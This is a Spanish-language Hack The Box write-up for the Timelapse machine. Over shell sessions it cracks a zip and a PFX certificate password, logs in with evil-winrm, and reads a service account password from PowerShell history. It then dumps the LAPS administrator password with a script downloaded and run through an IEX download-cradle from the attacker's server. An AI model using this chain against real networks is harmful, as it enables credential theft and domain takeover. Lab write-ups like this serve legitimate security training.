---
layout: single
title: Timelapse - Hack The Box
excerpt: "En este post vamos a resolver la maquina Timelapse de la plataforma de Hackthebox donde mediante SMB vamos a obtener un zip que contiene un archivo pfx pero antes de obtenerlo tendremos que crackear el zip ya que nos pide la contraseña estaremos usando openssl para obtener un cert y una key usando el pfx una vez obtenemos eso nos conectaremos con evil-winrm y gracias a que un usuario forma parte del grupo LAPS_Readers vamos a poder ver la contraseña del usuario gracias al historial de powershell para la escalada de privilegios estaremos abusando del grupo LAPS_Readers y usaremos Get-LAPSPasswords para dumpear las contraseñas entre ellas la del Administrator"
date: 2023-07-27
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-timelapse/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - SMB Enumeration
  - Cracking Zip Password Protected File
  - Cracking and reading .PFX File
  - SSL access
  - Powershell history
  - Abusing LAPS to get passwords
  - Active Directory
---

<p align="center">
<img src="/assets/images/htb-writeup-timelapse/banner.png">
</p>

```bash
❯ ping -c 1 10.129.141.32
PING 10.129.141.32 (10.129.141.32) 56(84) bytes of data.
64 bytes from 10.129.141.32: icmp_seq=1 ttl=127 time=147 ms

--- 10.129.141.32 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.439/147.439/147.439/0.000 ms
❯ whichSystem.py 10.129.141.32

10.129.141.32 (ttl -> 127): Windows
```

## PortScan

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49697 10.129.141.32 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 12:08 CST
Nmap scan report for 10.129.141.32
Host is up (0.15s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-27 02:08:34Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-07-27T02:10:06+00:00; +7h59m59s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49697/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-27T02:09:27
|_  start_date: N/A
```

## Enumeracion

Vamos a ver primeramente ante que estamos 

```bash
❯ crackmapexec smb 10.129.141.32
SMB         10.129.141.32   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

Vamos agregar el dominio al `/etc/hosts`

```bash
❯ echo "10.129.141.32 timelapse.htb dc01.timelapse.htb" | sudo tee -a /etc/host
10.129.141.32 timelapse.htb dc01.timelapse.htb
```

Vamos a comenzar viendo los recursos compartidos por **SMB** para ver si podemos listar algunos empleando un **Null Session** por que de momento no contamos con credenciales

```bash
❯ smbclient -L 10.129.141.32 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Vemos un archivo `winrm_backup.zip` vamos a traerlo a nuestra maquina de atacante

```bash
❯ smbclient -N //10.129.141.32/Shares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021

		6367231 blocks of size 4096. 1245724 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

		6367231 blocks of size 4096. 1244581 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \Dev\> 
```

## Shell as legacyy

Vemos que dentro hay un `.pfx`

```bash
❯ 7z l winrm_backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 08:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 08:21:20               2555         2405  1 files
```

![](/assets/images/htb-writeup-timelapse/web1.png)

Nos pide contraseña 

```bash
❯ 7z x winrm_backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Extracting archive: winrm_backup.zip
--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

    
Enter password (will not be echoed):
```

Vamos a usar `john` para poder ver la contraseña 

```bash
❯ zip2john winrm_backup.zip > hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
```

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2023-07-26 12:27) 1.428g/s 4956Kp/s 4956Kc/s 4956KC/s surfroxy154..superview1024
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ahora si podemos traernos el archivo

```bash
❯ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
```

Si recordamos nos dicen que `pfx` es una clave privada de un certificado así que necesitamos extraer ese certificado <https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file>

Siguiente los pasos del articulo vemos que si hacemos lo siguiente para extraer la **private key** nos pide contraseña 

![](/assets/images/htb-writeup-timelapse/web2.png)

```bash
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert
Enter Import Password:
```

Pero bueno podemos usar `pfx2john` 

```bash
❯ python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > hash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:42 DONE (2023-07-26 12:48) 0.02365g/s 76436p/s 76436c/s 76436C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

![](/assets/images/htb-writeup-timelapse/web3.png)

Ahora si podemos seguir

Vamos a extraer el certificado y la clave privada

```bash
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert
Enter Import Password:
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

El puerto `5986/tcp` es abierto así que nos podemos conectar empleando `winrm` con el `cert` y la `key`

```bash
❯ evil-winrm -h
                                        
Evil-WinRM shell v3.5

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

```bash
❯ evil-winrm -S -i 10.129.141.32 -c cert -k key
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
Enter PEM pass phrase: thuglegacy
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

## User.txt

```bash
*Evil-WinRM* PS C:\Users> Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue
Enter PEM pass phrase:


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/26/2023   7:01 PM             34 user.txt
```

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\Desktop\user.txt
9a2077a3a7ce5b1fec186ad86b228077
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

## Shell as svc_deploy

Aquí vemos varios usuarios

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user
Enter PEM pass phrase:

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

Si examinamos a que grupos pertenecen cada usuario vemos que `svc_deploy` forma parte de `LAPS_Readers` ademas forma parte del grupo `Remote Management Users` así que podemos conectarnos con `evil-winrm`

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
Enter PEM pass phrase:
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

<https://www.hackingarticles.in/credential-dumpinglaps/> en este caso como estamos en `powershell` podemos ver el historial de comandos como el `bash_history`

![](/assets/images/htb-writeup-timelapse/web4.png)

Y hay vemos la contraseña del usuario `E3R$Q62^12p7PLlC%KWaxuaV`

```bash
*Evil-WinRM* PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy> 
```

Ahora nos podemos conectar 

```bash
❯ evil-winrm -S -i 10.129.141.32 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

## Escalada de privilegios and Shell as administrator 

Como formamos parte del grupo `LAPS_Readers` vamos a usar este recurso <https://github.com/kfosaaen/Get-LAPSPasswords> para ver si podemos dumpear todas las contraseñas almacenadas

```bash
❯ wget https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
--2023-07-26 13:59:10--  https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 7419 (7.2K) [text/plain]
Grabando a: «Get-LAPSPasswords.ps1»

Get-LAPSPasswords.ps1           100%[=======================================================>]   7.25K  --.-KB/s    en 0s      

2023-07-26 13:59:10 (34.4 MB/s) - «Get-LAPSPasswords.ps1» guardado [7419/7419]
```

Ahora ejecutamos un servidor **http** con **Python3** para poder traernos el **script**

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Ahora lo descargamos

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8080/Get-LAPSPass
words.ps1')
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.141.32 - - [26/Jul/2023 14:02:29] "GET /Get-LAPSPasswords.ps1 HTTP/1.1" 200 -
```

Ahora dumpeamos todas las credenciales

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords


Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 09{z4]5BiSl,e$1d9!+t8GT#
Expiration : 7/31/2023 7:01:37 PM

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 09{z4]5BiSl,e$1d9!+t8GT#
Expiration : 7/31/2023 7:01:37 PM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 09{z4]5BiSl,e$1d9!+t8GT#
Expiration : 7/31/2023 7:01:37 PM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 09{z4]5BiSl,e$1d9!+t8GT#
Expiration : 7/31/2023 7:01:37 PM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA



*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

Vamos a validar si una de las contraseñas es del usuario `Administrator`

```bash
❯ crackmapexec smb 10.129.141.32 -u 'Administrator' -p '09{z4]5BiSl,e$1d9!+t8GT#'
SMB         10.129.141.32   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.141.32   445    DC01             [+] timelapse.htb\Administrator:09{z4]5BiSl,e$1d9!+t8GT# (Pwn3d!)
```

## root.txt 

Ahora nos conectamos 

```bash
❯ evil-winrm -S -i 10.129.141.32 -u 'Administrator' -p '09{z4]5BiSl,e$1d9!+t8GT#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users
*Evil-WinRM* PS C:\Users> dir -recurse root.txt


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/26/2023   7:01 PM             34 root.txt


*Evil-WinRM* PS C:\Users> type C:\Users\TRX\Desktop\root.txt
ce3a58c7d90fbfcf1a8f22fa31375e8d
*Evil-WinRM* PS C:\Users> 
```
